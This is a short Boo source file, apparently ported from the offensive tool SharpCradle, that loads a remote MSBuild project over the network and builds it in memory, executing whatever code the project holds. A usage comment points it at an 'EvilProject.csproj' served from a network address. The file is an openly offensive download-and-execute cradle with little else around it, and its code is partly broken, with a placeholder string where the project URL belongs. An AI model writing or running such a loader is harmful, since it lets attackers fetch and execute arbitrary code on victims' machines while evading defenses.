#ported from https://github.com/anthemtotheego/SharpCradle
#SharpCradle.exe -p https://192.168.1.10/EvilProject.csproj

import System
import System.Xml
import Microsoft.Build

public static def remoteproject(project as (string)):

		try:
			
			project = "PROJECT",
			
			if project.Length > 0 :

				proj = System.Xml.XmlReader.Create(project[0])
				msbuild = Microsoft.Build.Evaluation.Project(proj)
				msbuild.Build()
				proj.Close()
		except :
			Console.WriteLine('Something went wrong! Check parameters and make sure binary uses managed code')


public static def Main():
	project = "PROJECT"
	remoteproject(project as (string))